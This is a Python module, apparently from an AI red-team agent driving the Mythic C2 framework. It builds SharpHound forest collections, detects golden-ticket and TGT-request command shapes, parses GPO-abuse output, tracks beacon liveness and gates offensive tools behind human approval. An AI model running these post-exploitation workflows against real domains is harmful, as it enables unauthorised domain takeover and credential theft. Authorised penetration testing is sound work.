import os
import contextvars
import inspect
from dataclasses import asdict, is_dataclass, replace
try:
    from . import auth_context
except ImportError:
    import auth_context
# Durable cross-run engagement ledger config. The achieved-hops ledger is maintained incrementally in
# code (zero LLM inference); these knobs let it survive across runs/restarts as a per-engagement JSON.
# Key per-ENGAGEMENT (broader than the per-solve ParentTaskID/agent_task_id) so separate solves resume.
SAGE_ENGAGEMENT_ID = os.environ.get("SAGE_ENGAGEMENT_ID", "").strip() or "default"
SAGE_ENGAGEMENT_OBJECTIVE = os.environ.get("SAGE_ENGAGEMENT_OBJECTIVE", "").strip()
_task_visibility_context: contextvars.ContextVar[dict | None] = contextvars.ContextVar(
    "sage_mythic_task_visibility_context",
    default=None,
)
_POLICY_EVIDENCE_FIELDS = (
    "episode_id",
    "decision_id",
    "policy_mode",
    "candidate_hash",
    "candidate_count",
    "selected_index",
    "selected_family",
    "selected_is_first_admissible",
    "disposition",
    "rationale",
    "raw_response",
    "raw_disposition",
    "raw_rationale",
    "model_response_observed",
    "effective_backend",
    "effective_model_provider",
    "effective_model_id",
    "backend_provenance_source",
    "policy_version",
    "selection_contract",
    "selection_contract_hash",
    "decision_owner",
    "raw_candidate_count",
    "admissible_candidate_count",
    "semantic_candidate_ids",
    "candidate_set_hash",
    "ordered_frontier_hash",
    "selected_candidate_id",
    "symbolic_counterfactual_candidate_id",
    "branch_opportunity_count",
    "model_owned_decision_count",
    "kernel_singleton_count",
    "model_branch_coverage",
    "causally_decisive_decision_count",
    "forced_intervention",
    "intervention_id",
    "forced_policy_win_credit",
    "request_schema_hash",
    "prompt_hash",
)


def _policy_decision_evidence(value) -> dict:
    if not isinstance(value, dict):
        return {}
    evidence = {}
    for key in _POLICY_EVIDENCE_FIELDS:
        if key not in value:
            continue
        item = value.get(key)
        if item is None or item == "":
            continue
        evidence[key] = item
    return evidence


# Durable-hop TTL (hours). A loaded "achieved" hop older than this is dropped at load so a stale belief
# (e.g. after a GOAD redeploy) cannot suppress a real hop. Default 0 = disabled (no expiry). The gate
# also refuses to SILENTLY hard-SKIP a durable hop unless live footholds corroborate it — TTL is the
# cheap first line; corroboration is the second.
def _engagement_hop_ttl_hours() -> float:
    try:
        return float(os.environ.get("SAGE_ENGAGEMENT_HOP_TTL_HOURS", "0") or 0)
    except (ValueError, TypeError):
        return 0.0


def _looks_like_bloodhound_collection_zip(content: bytes) -> bool:
    if not isinstance(content, (bytes, bytearray)) or len(content) < 128:
        return False
    try:
        import io
        import zipfile
        with zipfile.ZipFile(io.BytesIO(content)) as archive:
            names = [name for name in archive.namelist() if not name.endswith("/")]
    except Exception:
        return False
    return any(name.lower().endswith(".json") for name in names)


def _mcp_response_data(response):
    try:
        text = response
        if isinstance(response, list) and response and isinstance(response[0], dict):
            text = response[0].get("text", "")
        parsed = json.loads(text) if isinstance(text, str) else (text or {})
        return parsed.get("data") if isinstance(parsed, dict) else None
    except Exception:
        return None


async def _bloodhound_collected_domains(info_tool=None) -> list[str]:
    """Return domains BloodHound marks fully collected, never trust mere stub-domain presence."""
    try:
        if info_tool is None:
            from ai.mcp import MCPManager
            for server in MCPManager.get_connected_servers():
                if not MCPManager.is_bloodhound_server(server):
                    continue
                info_tool = next(
                    (
                        tool for tool in MCPManager.get_tools_by_server(server)
                        if getattr(tool, "name", "") == "domain_info"
                    ),
                    None,
                )
                if info_tool is not None:
                    break
        if info_tool is None:
            return []
        response = await info_tool.ainvoke({
            "info_type": "list",
            "domain_id": "",
            "query": "",
            "object_type": "",
            "limit": 100,
            "skip": 0,
        })
        data = _mcp_response_data(response)
        rows = data.get("data", []) if isinstance(data, dict) else data
        if not isinstance(rows, list):
            return []
        return sorted({
            str(row.get("name") or "").strip().casefold()
            for row in rows
            if isinstance(row, dict)
            and row.get("collected") is True
            and str(row.get("name") or "").strip()
        })
    except Exception:
        return []


SHARPHOUND_CANONICAL_OUTPUT_DIRECTORY = r"C:\Users\Public"
SHARPHOUND_CANONICAL_ZIP_FILENAME = "bloodhound.zip"


def _operator_requested_collection(prompt: str) -> bool:
    """True when the operator is explicitly asking Sage to launch a collection this turn.

    Collection dedupe is an autonomous efficiency rule, not a reason to ignore a direct operator
    instruction. Keep this classifier intentionally narrow: it recognizes imperative collection
    requests and ignores questions, summaries, and explicit inhibit wording.
    """
    text = str(prompt or "").strip().casefold()
    if not text:
        return False
    tool = r"(?:sharphound|azurehound|bloodhound(?:\s+graph)?\s+collection)"
    action = r"(?:run|re[- ]?run|execute|launch|perform|start|collect|re[- ]?collect|gather)"
    inhibit = rf"\b(?:do not|don't|dont|never|did not|didn't|didnt|should not|shouldn't|shouldnt)\b.{{0,80}}\b{action}\b.{{0,80}}\b{tool}\b"
    if _re_mod.search(inhibit, text):
        return False
    request = (
        rf"(?:^|[.!?]\s+|\b(?:please|need|want|go ahead and|let's|lets|can you|could you)\s+)"
        rf"(?:(?:you\s+)?to\s+)?\b{action}\b.{{0,80}}\b{tool}\b"
    )
    return bool(_re_mod.search(request, text))


def _sharphound_zip_suffix(parameters) -> str:
    """Return the collector-requested ZIP basename, if the task supplied one."""
    try:
        if isinstance(parameters, dict):
            text = " ".join(str(value) for value in parameters.values() if value is not None)
        else:
            text = str(parameters or "")
        match = _re_mod.search(
            r"(?i)(?:^|\s)--zipfilename(?:\s+|=|:)(\"[^\"]+\"|'[^']+'|\S+)",
            text,
        )
        if not match:
            return ""
        value = match.group(1).strip().strip("\"'").rstrip("]},)")
        return value.replace("\\", "/").rsplit("/", 1)[-1].strip().casefold()
    except Exception:
        return ""


def build_sharphound_arguments(
    output_directory: str = SHARPHOUND_CANONICAL_OUTPUT_DIRECTORY,
    zip_filename: str = SHARPHOUND_CANONICAL_ZIP_FILENAME,
    domain: str = "",
    domain_controller: str = "",
) -> str:
    """Build version-stable SharpHound 2.x collection args without range-specific literals.

    --SearchForest enumerates ALL domains in the current forest (not just the foothold's own domain), so a
    child-domain foothold still collects the PARENT domain's DC + SIDs — required for cross-domain escalation
    (child->parent SID-history golden ticket + parent DCSync need the parent DC, which a domain-scoped
    collection omits). For a trusted domain outside the current forest, callers can pass ``domain`` to emit a
    targeted ``--Domain`` collection instead. ``domain_controller`` is optional and should be used only when a
    generic resolver has already proven a specific DC is needed; the normal targeted path lets SharpHound
    resolve the DC itself."""
    output_directory = str(output_directory or "").strip() or SHARPHOUND_CANONICAL_OUTPUT_DIRECTORY
    zip_filename = str(zip_filename or "").strip() or SHARPHOUND_CANONICAL_ZIP_FILENAME
    domain = str(domain or "").strip()
    domain_controller = str(domain_controller or "").strip()
    scope = f"--Domain {domain}" if domain else "--SearchForest"
    if domain_controller:
        scope += f" --DomainController {domain_controller}"
    return f"-c All --CollectAllProperties {scope} --OutputDirectory {output_directory} --ZipFilename {zip_filename}"


def normalize_sharphound_arguments(arguments: str) -> str:
    """Rewrite only SharpHound 2.x-rejected short aliases.

    SharpHound 2.x dropped `-o`; use `--OutputDirectory` while preserving the supplied value.
    """
    if not isinstance(arguments, str) or not arguments.strip():
        return arguments
    if "--OutputDirectory" in arguments:
        return arguments
    value = r'(?:"[^"]+"|\'[^\']+\'|\S+)'
    normalized = _re_mod.sub(rf"(?<!\S)-o=({value})", r"--OutputDirectory \1", arguments)
    normalized = _re_mod.sub(rf"(?<!\S)-o\s+({value})", r"--OutputDirectory \1", normalized)
    return normalized


def _graph_facts_missing_credential_domains(graph_facts, credential_domains) -> bool:
    domains = {
        str(domain or "").strip().casefold()
        for domain in credential_domains or []
        if str(domain or "").strip()
    }
    if not domains:
        return False
    covered: set[str] = set()
    for graph_fact in graph_facts or []:
        predicate = str(getattr(graph_fact, "predicate", "") or "").casefold()
        if predicate.startswith("credential-target:") and "@" in predicate:
            covered.add(predicate.rsplit("@", 1)[1].strip())
            continue
        marker = "account_domain="
        if marker in predicate:
            tail = predicate.split(marker, 1)[1]
            domain = tail.split(";", 1)[0].strip()
            if domain:
                covered.add(domain)
    return bool(domains - covered)


import json
import re as _re_mod
from pathlib import Path


def _engagement_ledger_mod():
    """The shared ledger module — single source of truth for the ledger path/IO, used by BOTH this agent
    and the operator-facing `engagement` Mythic command so they never drift onto different files."""
    try:
        from . import engagement_ledger
    except ImportError:  # when ai/langgraph is on sys.path directly (tests, some runtimes)
        import engagement_ledger
    return engagement_ledger


def _publish_active_engagement_id(key: str | None) -> None:
    """Publish the frozen engagement key to the shared ledger module so process-local diagnostics (e.g. the
    rights-trace) can attribute records to this seed. The harness sets SAGE_ENGAGEMENT_ID on ITSELF, not on
    the persistent Sage process, so this published value — not the env — is the reliable in-process source.
    Best-effort; never raises into the engagement-key resolution path."""
    try:
        _engagement_ledger_mod().set_active_engagement_id(key)
    except Exception:
        pass


def _engagement_state_dir() -> str:
    """Directory for the durable per-engagement ledger (delegated). SAGE_ENGAGEMENT_STATE_DIR overrides."""
    return _engagement_ledger_mod().state_dir()


def _engagement_ledger_file(engagement_id: str | None = None) -> str:
    """Absolute path to the JSON ledger for an engagement key (delegated to the shared module)."""
    return _engagement_ledger_mod().ledger_path(engagement_id or SAGE_ENGAGEMENT_ID)
import asyncio
import ast
import base64
from datetime import datetime, timezone
import hashlib
import inspect
import re
from typing import Annotated, Any, List, Dict, TypedDict
import aiohttp
from mythic import mythic, mythic_classes
from mythic_container.MythicGoRPC import SendMythicRPCAPITokenCreate, MythicRPCAPITokenCreateMessage
from mythic_container.logging import logger
from langchain.tools import tool, BaseTool
from langchain_core.tools import StructuredTool

try:
    from . import ttp_library
except ImportError:  # allow running this module directly for manual testing
    import ttp_library

try:
    from . import command_builder
except ImportError:  # allow running this module directly for manual testing
    import command_builder

try:
    from .footprint import footprint
except ImportError:
    from footprint import footprint


def _summarize_footprint(axes: dict) -> str:
    axes_total = sum(axes.values())
    parts = []
    if axes.get("new_beacon", 0) >= 2:
        parts.append("plants a new beacon")
    if axes.get("lateral_hop", 0) >= 2:
        parts.append("moves laterally to a remote host")
    if axes.get("new_process", 0) >= 2:
        parts.append("spawns a process")
    if axes.get("disk_artifact", 0) >= 2:
        parts.append("writes a file to disk")
    if axes.get("flagged_tool", 0) >= 1:
        parts.append("may run a flagged tool")
    if axes.get("network_signature", 0) >= 2:
        parts.append("network-visible")
    if axes.get("reversibility", 0) >= 2:
        parts.append("hard to clean up")
    if not parts:
        parts.append("low footprint")
    return f"footprint {axes_total}: " + "; ".join(parts)


# Well-known Apollo/Mythic signatures for command failures that arrive as task OUTPUT
# (not as raised exceptions). Used by the issue_task circuit breaker to count agent-side
# failures so the LLM cannot blindly re-issue a failing command. Conservative on purpose —
# only unambiguous failure phrases, to avoid miscounting legitimate command output.
# Breaker signatures: SPECIFIC, unambiguous Apollo/Mythic tasking-layer failures. Kept narrow on
# purpose — these feed the issue_task circuit breaker, where a false positive on a SUCCESSFUL command
# (whose output merely quotes one of these strings as data) would wrongly count toward a STOP and
# block legitimate tasking. Do NOT add generic phrases here (see _READ_FAILURE_SIGNATURES).
_TASK_FAILURE_SIGNATURES = (
    "failed to parse arguments",
    "don't match any parameters",
    "invalid values",
    "failed to create task",
    "takes no command line arguments",
)

# Read-guard signatures: the breaker set PLUS broader runtime-execution failures (the no-progress
# re-read spiral on 2026-06-01 was a .NET assembly exception + a jump_wmi traceback). These are scoped
# to the get_all_task_output_by_task_id re-read clamp ONLY — never to the breaker — because the broader
# phrases ("unexpected error", "traceback...") can appear as legitimate DATA in a successful task's
# output; the worst case here is merely a clamped 2nd re-read of one task, not a blocked command.
_READ_FAILURE_SIGNATURES = _TASK_FAILURE_SIGNATURES + (
    "exception has been thrown by the target of an invocation",
    "unexpected error",
    "traceback (most recent call last)",
)

# Recording-gate signatures: BROADER than the breaker, used ONLY to decide whether a no-probe (legacy)
# technique may record `achieved`. Includes Mythic/agent INFRASTRUCTURE errors — a task that errored at
# CREATION ("error: creating task"), a .NET assembly that was never registered ("no assembly by that name"),
# an unknown callback/payload — plus tracebacks and the breaker set. These are produced by Mythic/the agent,
# NOT the target, so they are a trustworthy "this task did not run/succeed" signal. (2026-06-12: SharpGPOAbuse
# errored "no assembly by that name" at task creation; the narrow breaker missed it, so gpo-abuse recorded
# achieved off a task that never ran.)
_RECORD_FAILURE_SIGNATURES = _READ_FAILURE_SIGNATURES + (
    "no assembly by that name",
    "error: creating task",
    "no callback by that name",
    "no payload by that name",
    "error: command not found",
)

_REGISTERED_FILE_PREFLIGHT_PREFIX = "[registered-file-preflight]"


def _record_output_is_failure(output: str) -> bool:
    """True when task output shows the task did NOT cleanly succeed: empty/whitespace output, or a Mythic/agent
    infrastructure error / traceback / known agent-side failure. Gates the LEGACY no-probe recording path so a
    no-artifact technique (e.g. gpo-abuse) never records `achieved` off a failed or empty task. Intentionally
    broad: for a no-probe hop, under-recording (a retry) is far safer than a false-achieved that corrupts the solve."""
    if not output or not str(output).strip():
        return True
    low = str(output).lower()
    return any(sig in low for sig in _RECORD_FAILURE_SIGNATURES)


def _gpo_abuse_guid_only_noop(output: str) -> bool:
    """SharpGPOAbuse can print only discovery lines (Domain/DC/DN/GUID) when it does not apply a change.
    Treat that as a no-op: there is no new artifact to wait on and no effect proof to record."""
    text = str(output or "")
    if not text.strip():
        return False
    low = text.casefold()
    discovery_markers = (
        "[+] domain =",
        "[+] domain controller =",
        "[+] distinguished name =",
        "[+] guid of",
    )
    if not any(marker in low for marker in discovery_markers):
        return False
    if "[sage result] invalid parameters/no-op" in low:
        return True
    success_markers = (
        "gpo was modified",
        "modified to include",
        "scheduled task was created",
        "successfully added",
        "versionnumber attribute changed",
        "version number attribute changed",
        "scheduledtasks.xml",
        "immediate scheduled task",
        "immediate task",
    )
    return not any(marker in low for marker in success_markers)


def _gpo_abuse_setup_needs_proof(output: str) -> bool:
    """True when SharpGPOAbuse appears to have written the GPO setup artifact, but no SYSTEM/effect proof is present."""
    text = str(output or "")
    if not text.strip() or _record_output_is_failure(text) or _gpo_abuse_guid_only_noop(text):
        return False
    low = text.casefold()
    if "[sage result] gpo setup pending" in low:
        return True
    setup_markers = (
        "gpo was modified",
        "modified to include",
        "scheduled task was created",
        "versionnumber attribute changed",
        "version number attribute changed",
        "gpt.ini was increased",
        "scheduledtasks.xml",
        "wait for the gpo refresh cycle",
    )
    proof_markers = (
        "nt authority\\system",
        "system execution proven",
        "domain admins enabled group",
    )
    return any(marker in low for marker in setup_markers) and not any(marker in low for marker in proof_markers)


_CALLBACK_LIVENESS_QUERY = """
    query cbinfo($ids:[Int!]) {
      callback(where: {display_id: {_in: $ids}}) {
        display_id active last_checkin
        payload { payloadtype { name } }
        c2profileparametersinstances(where: {c2profileparameter: {name: {_in: ["callback_interval","callback_jitter"]}}}) { value c2profileparameter { name } }
        tasks(order_by: {id: desc}, limit: 40) { command_name original_params status completed timestamp status_timestamp_processed }
      }
    }
"""


def _parse_mythic_datetime(value: str | None) -> datetime | None:
    """Parse Mythic's UTC-ish ISO timestamps without raising."""

    if not value or not isinstance(value, str):
        return None
    raw = value.strip()
    if not raw:
        return None

    candidates = [raw]
    if raw.endswith("Z"):
        candidates.append(raw[:-1] + "+00:00")
    if "." in raw:
        head, tail = raw.split(".", 1)
        offset = ""
        fraction = tail
        for marker in ("+", "-"):
            if marker in tail:
                fraction, offset = tail.split(marker, 1)
                offset = marker + offset
                break
        candidates.append(head + "." + fraction[:6] + offset)

    for candidate in candidates:
        try:
            parsed = datetime.fromisoformat(candidate)
            if parsed.tzinfo is None:
                return parsed.replace(tzinfo=timezone.utc)
            return parsed.astimezone(timezone.utc)
        except (TypeError, ValueError):
            continue
    return None


def _parse_int(value: str | int | None) -> int | None:
    """Parse an integer-ish value without raising."""

    if value is None:
        return None
    try:
        return int(value)
    except (TypeError, ValueError):
        return None


def _extract_first_int(value: object) -> int | None:
    """Extract the first integer token from a value without raising."""

    match = re.search(r"-?\d+", str(value))
    if match is None:
        return None
    try:
        return int(match.group(0))
    except ValueError:
        return None


def _parse_sleep_interval(original_params: object) -> int | None:
    """Parse a sleep interval from Mythic sleep task params without raising."""

    if original_params is None:
        return None
    if isinstance(original_params, dict):
        if "interval" in original_params:
            return _extract_first_int(original_params.get("interval"))
        return None

    raw = str(original_params).strip()
    if not raw:
        return None
    try:
        parsed = json.loads(raw)
        if isinstance(parsed, dict) and "interval" in parsed:
            interval = _extract_first_int(parsed.get("interval"))
            if interval is not None:
                return interval
    except (TypeError, ValueError, json.JSONDecodeError):
        pass
    return _extract_first_int(raw)


def _task_timestamp_sort_key(task_with_index: tuple[int, dict]) -> tuple[int, datetime, int]:
    """Sort newest parsed task timestamps first, using original order for ties/missing timestamps."""

    index, task = task_with_index
    parsed = _parse_mythic_datetime(task.get("timestamp") if isinstance(task, dict) else None)
    if parsed is None:
        return (0, datetime.min.replace(tzinfo=timezone.utc), -index)
    return (1, parsed, -index)


def _format_duration(seconds: float | int | None) -> str:
    """Return a short approximate human duration for large gaps."""

    if seconds is None or seconds < 3600:
        return ""
    total_minutes = int(seconds // 60)
    hours = total_minutes // 60
    minutes = total_minutes % 60
    return f" (≈{hours}h{minutes}m)"


def _format_seconds(value: float | int | None) -> str:
    if value is None:
        return "unknown"
    if float(value).is_integer():
        return f"{int(value)}"
    return f"{float(value):.1f}"


def _compute_liveness(
    *,
    display_id: int,
    last_checkin: str | None,
    callback_interval: str | int | None,
    callback_jitter: str | int | None,
    tasks: list[dict],
    payload_type: str | None = None,
    active: bool | None = None,
    now: datetime | None = None,
) -> dict:
    """Compute callback liveness from check-in time, effective sleep, jitter, and recent tasks."""

    now_utc = now or datetime.now(timezone.utc)
    if now_utc.tzinfo is None:
        now_utc = now_utc.replace(tzinfo=timezone.utc)
    else:
        now_utc = now_utc.astimezone(timezone.utc)

    normalized_payload_type = str(payload_type or "").strip().casefold()
    if normalized_payload_type == "sage":
        parsed_last_checkin = _parse_mythic_datetime(last_checkin)
        seconds_since_checkin = (
            (now_utc - parsed_last_checkin).total_seconds()
            if parsed_last_checkin is not None
            else None
        )
        taskable = active is not False
        return {
            "display_id": display_id,
            "status": "taskable" if taskable else "inactive",
            "alive": taskable,
            "last_checkin": last_checkin,
            "seconds_since_checkin": seconds_since_checkin,
            "effective_sleep_seconds": None,
            "sleep_source": "service",
            "jitter_pct": 0,
            "threshold_seconds": None,
            "queued_since_checkin": 0,
            "suspect_crash_task": None,
            "payload_type": "sage",
            "liveness_mode": "service",
            "reason": (
                f"Sage callback {display_id} is service-backed and taskable; its Mythic timestamp advances "
                "only when a command is sent"
                if taskable
                else f"Sage callback {display_id} is marked inactive in Mythic"
            ),
        }

    effective_sleep_seconds = _parse_int(callback_interval)
    sleep_source = "c2_profile" if effective_sleep_seconds is not None else "unknown"
    safe_tasks = [task for task in tasks if isinstance(task, dict)] if isinstance(tasks, list) else []
    sleep_tasks = [
        (index, task)
        for index, task in enumerate(safe_tasks)
        if task.get("command_name") == "sleep"
    ]
    for _, task in sorted(sleep_tasks, key=_task_timestamp_sort_key, reverse=True):
        sleep_interval = _parse_sleep_interval(task.get("original_params"))
        if sleep_interval is not None:
            effective_sleep_seconds = sleep_interval
            sleep_source = "sleep_task"
            break

    jitter_pct = _parse_int(callback_jitter)
    if jitter_pct is None:
        jitter_pct = 0

    max_expected_gap = None
    if effective_sleep_seconds is not None:
        max_expected_gap = effective_sleep_seconds * (1 + jitter_pct / 100)

    if effective_sleep_seconds == 0 or effective_sleep_seconds is None:
        threshold_seconds = 180
    else:
        threshold_seconds = 5 * max_expected_gap + max(30, effective_sleep_seconds)

    parsed_last_checkin = _parse_mythic_datetime(last_checkin)
    if parsed_last_checkin is None:
        reason = f"callback {display_id} has no usable last_checkin; liveness is uncertain"
        return {
            "display_id": display_id,
            "status": "uncertain",
            "alive": False,
            "last_checkin": last_checkin,
            "seconds_since_checkin": None,
            "effective_sleep_seconds": effective_sleep_seconds,
            "sleep_source": sleep_source,
            "jitter_pct": jitter_pct,
            "threshold_seconds": threshold_seconds,
            "queued_since_checkin": 0,
            "suspect_crash_task": None,
            "reason": reason,
        }

    seconds_since_checkin = (now_utc - parsed_last_checkin).total_seconds()
    queued_since_checkin = 0
    for task in safe_tasks:
        status = str(task.get("status") or "").lower()
        if "submitted" not in status and "processing" not in status:
            continue
        task_timestamp = _parse_mythic_datetime(task.get("timestamp"))
        if task_timestamp is not None and task_timestamp > parsed_last_checkin:
            queued_since_checkin += 1

    dead_by_gap = seconds_since_checkin > threshold_seconds
    suspect_crash_task = None
    if dead_by_gap and queued_since_checkin > 0:
        candidates: list[tuple[datetime, int, dict]] = []
        for index, task in enumerate(safe_tasks):
            status = str(task.get("status") or "").lower()
            executed = task.get("completed") is True or any(
                marker in status for marker in ("success", "completed", "error")
            )
            if not executed:
                continue
            task_timestamp = _parse_mythic_datetime(task.get("timestamp"))
            if task_timestamp is None:
                continue
            if task_timestamp <= parsed_last_checkin:
                candidates.append((task_timestamp, -index, task))
            elif (task_timestamp - parsed_last_checkin).total_seconds() <= 5:
                candidates.append((task_timestamp, -index, task))
        if candidates:
            suspect_crash_task = max(candidates, key=lambda item: (item[0], item[1]))[2].get("command_name")

    if not dead_by_gap:
        status = "alive"
    elif suspect_crash_task is not None and queued_since_checkin > 0:
        status = "likely_crashed"
    else:
        status = "dead"

    interval_text = "unknown" if effective_sleep_seconds is None else f"{effective_sleep_seconds}s"
    max_gap_text = _format_seconds(max_expected_gap)
    threshold_text = _format_seconds(threshold_seconds)
    gap_text = _format_seconds(seconds_since_checkin)
    reason = (
        f"no checkin for {gap_text}s{_format_duration(seconds_since_checkin)}; "
        f"interval {interval_text}, jitter {jitter_pct}% → dead threshold "
        f"5×{max_gap_text}s+{_format_seconds(max(30, effective_sleep_seconds) if effective_sleep_seconds else 180)}s="
        f"{threshold_text}s"
    )
    if status in ("dead", "likely_crashed"):
        reason += f"; {queued_since_checkin} tasks queued since"
        if suspect_crash_task is not None:
            reason += f"; last executed before silence: {suspect_crash_task!r} — possible crash"
    else:
        reason += "; within threshold"

    return {
        "display_id": display_id,
        "status": status,
        "alive": status == "alive",
        "last_checkin": last_checkin,
        "seconds_since_checkin": seconds_since_checkin,
        "effective_sleep_seconds": effective_sleep_seconds,
        "sleep_source": sleep_source,
        "jitter_pct": jitter_pct,
        "threshold_seconds": threshold_seconds,
        "queued_since_checkin": queued_since_checkin,
        "suspect_crash_task": suspect_crash_task,
        "reason": reason,
    }


async def assess_callback_liveness(client, display_id: int, *, now: datetime | None = None) -> dict:
    """Fetch callback timing data from Mythic and compute a liveness verdict."""

    logger.debug(f"🛠️ Calling assess_callback_liveness for callback_display_id: {display_id}")
    try:
        resp = await mythic.execute_custom_query(client, _CALLBACK_LIVENESS_QUERY, variables={"ids": [display_id]})
        callbacks = resp.get("callback") if isinstance(resp, dict) else None
        if not isinstance(callbacks, list) or not callbacks:
            result = _compute_liveness(
                display_id=display_id,
                last_checkin=None,
                callback_interval=None,
                callback_jitter=None,
                tasks=[],
                now=now,
            )
            result["reason"] = f"callback {display_id} not found in Mythic"
            return result

        callback = callbacks[0] if isinstance(callbacks[0], dict) else {}
        profile_values: dict[str, object] = {}
        profile_instances = callback.get("c2profileparametersinstances")
        if isinstance(profile_instances, list):
            for instance in profile_instances:
                if not isinstance(instance, dict):
                    continue
                parameter = instance.get("c2profileparameter")
                if not isinstance(parameter, dict):
                    continue
                name = parameter.get("name")
                if name in ("callback_interval", "callback_jitter"):
                    profile_values[name] = instance.get("value")

        tasks = callback.get("tasks")
        if not isinstance(tasks, list):
            tasks = []

        return _compute_liveness(
            display_id=display_id,
            last_checkin=callback.get("last_checkin"),
            callback_interval=profile_values.get("callback_interval"),
            callback_jitter=profile_values.get("callback_jitter"),
            tasks=tasks,
            payload_type=(
                (((callback.get("payload") or {}).get("payloadtype") or {}).get("name"))
                if isinstance(callback.get("payload"), dict)
                else None
            ),
            active=callback.get("active"),
            now=now,
        )
    except Exception as e:
        result = _compute_liveness(
            display_id=display_id,
            last_checkin=None,
            callback_interval=None,
            callback_jitter=None,
            tasks=[],
            now=now,
        )
        result["reason"] = f"could not assess callback {display_id} liveness: {e}"
        return result


def _is_task_failure_output(output: str) -> bool:
    """True if task output contains a known agent-side command-failure signature (breaker scope)."""
    if not output:
        return False
    low = output.lower()
    return any(sig in low for sig in _TASK_FAILURE_SIGNATURES)


def _contains_identity_token(haystack: str, needle: str) -> bool:
    candidate = str(needle or "").strip().casefold()
    if not candidate:
        return False
    text = str(haystack or "").casefold()
    if "\\" in candidate:
        return candidate in text
    try:
        return re.search(rf"(?<![a-z0-9_.-]){re.escape(candidate)}(?![a-z0-9_.-])", text) is not None
    except Exception:
        return candidate in text


def _normalize_command_name(command: str) -> str:
    return str(command or "").strip().casefold().replace("-", "_")


def _task_output_text(output) -> str:
    """Return Mythic task output as text without leaking Python bytes reprs downstream."""
    if output is None:
        return ""
    if isinstance(output, bytes):
        return output.decode("utf-8", "replace")
    if isinstance(output, bytearray):
        return bytes(output).decode("utf-8", "replace")
    return str(output)


def _ticket_command_key(command: str, parameters) -> str:
    """Stable key for a builder-shaped Kerberos ticket forge command.

    The gate intentionally keys on exact commands emitted by the deterministic capability builder, not on a
    particular tool. That lets the adapter choose the lowest-footprint backend while still blocking prompt-built
    ticket forges that caused false ledger entries.
    """
    command_name = _normalize_command_name(command)
    values = parameters
    if isinstance(parameters, str):
        stripped = parameters.strip()
        if stripped.startswith("{") and stripped.endswith("}"):
            try:
                values = json.loads(stripped)
            except Exception:
                return ""
        else:
            return ""
    if not isinstance(values, dict):
        return ""
    if command_name == "mimikatz":
        for text in _command_argument_candidates(values, ("commands", "arguments", "argument", "args", "commandline")):
            if text.startswith("kerberos::golden") and "/domain:" in text and "/sid:" in text:
                return f"kerberos-forge:mimikatz:{text}"
    if command_name in {
        "execute_assembly",
        "inline_assembly",
        "load_assembly",
        "invoke_assembly",
        "assembly_inject",
    }:
        for text in _command_argument_candidates(values, (
            "assembly_arguments",
            "arguments",
            "argument",
            "args",
            "commandline",
            "params",
        )):
            if text.startswith("golden ") and "/domain:" in text and "/sid:" in text:
                return f"kerberos-forge:managed-assembly:{text}"
            if (
                text.startswith("asktgt ")
                and "/domain:" in text
                and "/user:" in text
                and any(flag in text for flag in ("/aes256:", "/aes128:", "/rc4:", "/ntlm:"))
            ):
                return f"kerberos-tgt:managed-assembly:{text}"
            if (
                text.startswith("asktgt ")
                and "/domain:" in text
                and "/user:" in text
                and "/certificate:" in text
            ):
                return f"kerberos-pkinit:managed-assembly:{text}"
    return ""


def _is_deterministic_ticket_command(command: str, parameters) -> bool:
    """True for a syntactically builder-shaped ticket command."""
    return bool(_ticket_command_key(command, parameters))


def _capability_command_key(command: str, parameters) -> str:
    command_name = _capability_command_name(command)
    try:
        shell_text = _shell_parameter_text(parameters) if _normalize_command_name(command) == "shell" else ""
        if shell_text:
            params_key = shell_text
        elif isinstance(parameters, str):
            params_key = parameters
        else:
            params_key = json.dumps(parameters, sort_keys=True, default=str)
    except Exception:
        params_key = str(parameters)
    return f"{command_name}:{params_key}"


def _shell_parameter_text(parameters) -> str:
    if isinstance(parameters, str):
        return parameters
    if not isinstance(parameters, dict):
        return ""
    lowered = {str(key).casefold(): value for key, value in parameters.items()}
    for key in ("command", "cmd", "shell", "arguments", "args"):
        value = lowered.get(key)
        if isinstance(value, str) and value.strip():
            return value
    return ""


def _capability_command_name(command: str) -> str:
    normalized = _normalize_command_name(command)
    if normalized in {"shell", "run"}:
        return "shell"
    return normalized


def _command_argument_candidates(values: dict, keys: tuple[str, ...]) -> list[str]:
    candidates: list[str] = []
    key_set = {str(key or "").strip().casefold() for key in keys}
    for existing_key, value in values.items():
        if str(existing_key or "").strip().casefold() not in key_set:
            continue
        raw_candidates = value if isinstance(value, list) else [value]
        for candidate in raw_candidates:
            text = " ".join(str(candidate or "").strip().casefold().split())
            if text:
                candidates.append(text)
    return candidates


def _is_failed_read_output(output: str) -> bool:
    """True if task output looks like a (re-read) failure — broader than the breaker scope. Used only
    by the get_all_task_output_by_task_id no-progress clamp."""
    if not output:
        return False
    low = output.lower()
    return any(sig in low for sig in _READ_FAILURE_SIGNATURES)


# HITL: single source of truth for which MythicTools methods are state-changing/offensive and
# therefore gated in supervised mode. Read-only get_*/list_*/download_file/ensure_tool_uploaded and
# the routing/transfer/respond tools are intentionally absent (free). model.py imports this set to
# build the HumanInTheLoopMiddleware interrupt_on map. Note: file_upload is a BloodHound MCP tool
# (not a MythicTools method) — included by name so supervised mode also gates it if/when connected.
GUARDED_TOOLS: set[str] = {
    "issue_task_and_waitfor_task_output",
    "upload_file_by_file_uuid",
    "materialize_capability_inputs",
    "execute_capability",
    "create_payload",
    "delete_payload",
    "download_tool",
    "ingest_collection",
    "sandbox_exec",
    "file_upload",
    "add_credential",
}

# Upper bound (seconds) on the chat bot-token mint. The SDK's RabbitMQ connect retries unboundedly, so
# without this login() would hang forever when Mythic is unreachable instead of degrading fail-closed.
_CHAT_TOKEN_MINT_TIMEOUT = 15


# Chat bot-token scope required per guarded tool (Section 8A P1). A chat channel's bot token is
# operator-scoped at setup, so a guarded tool whose scope isn't granted is preflight-disabled (fail cheap)
# rather than erroring mid-run. All scope strings verified against auth-adjustments
# `authentication/mythicjwt/scopes.go` (incl. `credential.write` — PRD §14k resolved).
SCOPE_REQUIREMENTS: dict[str, str] = {
    "issue_task_and_waitfor_task_output": "callback.write",
    "upload_file_by_file_uuid": "callback.write",
    "materialize_capability_inputs": "callback.write",
    "execute_capability": "callback.write",
    "ingest_collection": "callback.write",
    "sandbox_exec": "callback.write",
    "create_payload": "payload.write",
    "delete_payload": "payload.write",
    "download_tool": "file.write",
    "file_upload": "file.write",
    "add_credential": "credential.write",
}


def _allows_scope(granted: "set[str]", required: str) -> bool:
    """Mirror of the server's `mythicjwt.AllowsScope` for the cases our tool requirements hit.

